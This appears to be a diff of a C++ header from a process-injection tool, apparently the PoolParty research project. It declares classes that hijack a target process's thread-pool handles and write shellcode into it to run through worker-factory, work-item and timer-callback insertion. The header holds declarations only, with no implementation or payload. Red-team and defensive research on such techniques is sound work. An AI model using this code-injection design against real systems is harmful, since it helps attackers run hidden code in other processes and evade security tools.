@@ -18,21 +18,20 @@
 #include "WinApi.hpp"
 #include "HandleHijacker.hpp"
 
-namespace logging = boost::log;
-namespace keywords = boost::log::keywords;
+#define POOL_PARTY_POEM "Dive right in and make a splash,\n" \
+                        "We're throwing a pool party in a flash!\n" \
+                        "Bring your swimsuits and sunscreen galore,\n" \
+                        "We'll turn up the heat and let the good times pour!\n"
 
 #define POOL_PARTY_ALPC_PORT_NAME L"\\RPC Control\\PoolPartyALPCPort"
 #define POOL_PARTY_EVENT_NAME L"PoolPartyEvent"
-#define POOL_PARTY_FILE_NAME L"PoolParty_invitation.txt"
+#define POOL_PARTY_FILE_NAME L"PoolParty.txt"
 #define POOL_PARTY_JOB_NAME L"PoolPartyJob"
 
 #define INIT_UNICODE_STRING(str) { sizeof(str) - sizeof((str)[0]), sizeof(str) - sizeof((str)[0]), const_cast<PWSTR>(str) }
 
-/*
-TODO: 
-Fix design, winapi call wrappers should only handle errors via a generic template
-and then util functions for nicer usage should be created on top of those templates
-*/
+namespace logging = boost::log;
+namespace keywords = boost::log::keywords;
 
 typedef struct _POOL_PARTY_CMD_ARGS
 {
@@ -51,10 +50,12 @@ protected:
 	PVOID m_ShellcodeAddress;
 public:
 	PoolParty(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
-	std::shared_ptr<HANDLE> GetTargetProcessHandle() const;
 	std::shared_ptr<HANDLE> GetTargetThreadPoolWorkerFactoryHandle() const;
-	WORKER_FACTORY_BASIC_INFORMATION GetWorkerFactoryBasicInformation(HANDLE hWorkerFactory) const;  // TODO: This method should be implemented somewhere else
+	WORKER_FACTORY_BASIC_INFORMATION GetWorkerFactoryBasicInformation(HANDLE hWorkerFactory) const;
 	std::shared_ptr<HANDLE> GetTargetThreadPoolIoCompletionHandle() const;
+	std::shared_ptr<HANDLE> GetTargetThreadPoolTimerHandle() const;
+	std::shared_ptr<HANDLE> GetTargetProcessHandle() const;
+	virtual void HijackHandles();
 	virtual LPVOID AllocateShellcodeMemory() const;
 	void WriteShellcode() const;
 	virtual void SetupExecution() const PURE;
@@ -67,6 +68,7 @@ protected:
 	std::shared_ptr<HANDLE> m_p_hIoCompletion;
 public:
 	AsynchronousWorkItemInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
+	void HijackHandles() override;
 	virtual void SetupExecution() const PURE;
 	virtual ~AsynchronousWorkItemInsertion() = default;
 };
@@ -77,14 +79,18 @@ protected:
 	WORKER_FACTORY_BASIC_INFORMATION m_WorkerFactoryInformation;
 public:
 	WorkerFactoryStartRoutineOverwrite(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
+	void HijackHandles() override;
 	LPVOID AllocateShellcodeMemory() const override;
 	void SetupExecution() const override;
 	~WorkerFactoryStartRoutineOverwrite() override = default;
 };
 
 class RemoteWorkItemInsertion : public PoolParty {
+protected:
+	std::shared_ptr<HANDLE> m_p_hWorkerFactory;
 public:
 	RemoteWorkItemInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
+	void HijackHandles() override;
 	void SetupExecution() const override;
 	~RemoteWorkItemInsertion() override = default;
 };
@@ -125,8 +131,12 @@ public:
 };
 
 class RemoteTimerCallbackInsertion : public PoolParty {
+protected:
+	std::shared_ptr<HANDLE> m_p_hWorkerFactory;
+	std::shared_ptr<HANDLE> m_p_hTimer;
 public:
 	RemoteTimerCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize);
+	void HijackHandles() override;
 	void SetupExecution() const override;
 	~RemoteTimerCallbackInsertion() override = default;
 };
